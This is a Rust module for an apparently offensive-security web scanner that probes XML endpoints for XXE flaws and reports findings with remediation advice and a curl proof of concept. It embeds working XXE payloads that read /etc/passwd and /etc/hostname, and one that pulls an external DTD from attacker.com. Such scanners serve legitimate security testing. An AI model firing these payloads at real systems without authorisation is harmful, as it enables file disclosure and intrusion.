use crate::client::HttpClient;
use crate::scanners::VulnerabilityScanner;
use shadowprobe_core::{
    HttpMethod, Result, Severity, Vulnerability, VulnerabilityType,
};
use async_trait::async_trait;
use chrono::Utc;
use std::collections::HashMap;
use tracing::debug;
use uuid::Uuid;

pub struct XxeScanner;

impl XxeScanner {
    pub fn new() -> Self {
        Self
    }

    fn get_xxe_payloads(&self) -> Vec<(String, String, Vec<String>)> {
        vec![
            (
                "Classic XXE with SYSTEM entity".to_string(),
                r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"#.to_string(),
                vec!["root:".to_string(), "/bin/bash".to_string()],
            ),
            (
                "XXE with parameter entity".to_string(),
                r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
%xxe;
]>
<foo>test</foo>"#.to_string(),
                vec!["root:".to_string()],
            ),
            (
                "Blind XXE with external DTD".to_string(),
                r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>"#.to_string(),
                vec![],
            ),
            (
                "XXE via SVG upload".to_string(),
                r#"<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>"#.to_string(),
                vec![],
            ),
            (
                "XXE with CDATA".to_string(),
                r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>"#.to_string(),
                vec!["root:".to_string()],
            ),
        ]
    }

    async fn test_xml_endpoint(
        &self,
        client: &HttpClient,
        url: &str,
    ) -> Result<Vec<Vulnerability>> {
        let mut vulnerabilities = Vec::new();

        for (description, payload, patterns) in self.get_xxe_payloads() {
            debug!("Testing XXE: {} on {}", description, url);

            let mut headers = HashMap::new();
            headers.insert("Content-Type".to_string(), "application/xml".to_string());

            match client.request(&HttpMethod::POST, url, Some(&headers), Some(&payload)).await {
                Ok(response) => {
                    if self.is_vulnerable(&response.body, &patterns) {
                        vulnerabilities.push(Vulnerability {
                            id: Uuid::new_v4().to_string(),
                            vuln_type: VulnerabilityType::XXE,
                            severity: Severity::High,
                            url: url.to_string(),
                            method: HttpMethod::POST,
                            parameter: None,
                            payload: payload.clone(),
                            evidence: self.extract_evidence(&response.body, 300),
                            description: format!(
                                "XML External Entity (XXE) vulnerability detected using {}. The application parses XML with external entities enabled.",
                                description
                            ),
                            remediation: "Disable external entity processing in XML parsers. Use safe XML parsing libraries. Validate and sanitize all XML input.".to_string(),
                            poc: Some(format!(
                                "curl -X POST -H 'Content-Type: application/xml' -d '{}' '{}'",
                                payload.replace('\n', "\\n").replace('"', "\\\""),
                                url
                            )),
                            ai_confidence: None,
                            ai_analysis: None,
                            timestamp: Utc::now(),
                        });
                    }
                }
                Err(e) => {
                    debug!("Error testing XXE on {}: {}", url, e);
                }
            }
        }

        Ok(vulnerabilities)
    }

    fn is_vulnerable(&self, body: &str, patterns: &[String]) -> bool {
        if patterns.is_empty() {
            return false;
        }
        patterns.iter().any(|pattern| body.contains(pattern))
    }

    fn extract_evidence(&self, body: &str, max_len: usize) -> String {
        if body.len() > max_len {
            format!("{}...", &body[..max_len])
        } else {
            body.to_string()
        }
    }

    fn looks_like_xml_endpoint(&self, url: &str) -> bool {
        let xml_indicators = [
            "/api/xml",
            "/xml",
            "/soap",
            "/wsdl",
            ".xml",
            "/upload",
            "/import",
        ];

        xml_indicators.iter().any(|indicator| url.contains(indicator))
    }
}

#[async_trait]
impl VulnerabilityScanner for XxeScanner {
    fn name(&self) -> &str {
        "XXE Scanner"
    }

    fn vuln_type(&self) -> VulnerabilityType {
        VulnerabilityType::XXE
    }

    async fn scan(&self, client: &HttpClient, url: &str) -> Result<Vec<Vulnerability>> {
        // Only test endpoints that likely accept XML
        if !self.looks_like_xml_endpoint(url) {
            return Ok(vec![]);
        }

        self.test_xml_endpoint(client, url).await
    }
}

impl Default for XxeScanner {
    fn default() -> Self {
        Self::new()
    }
}
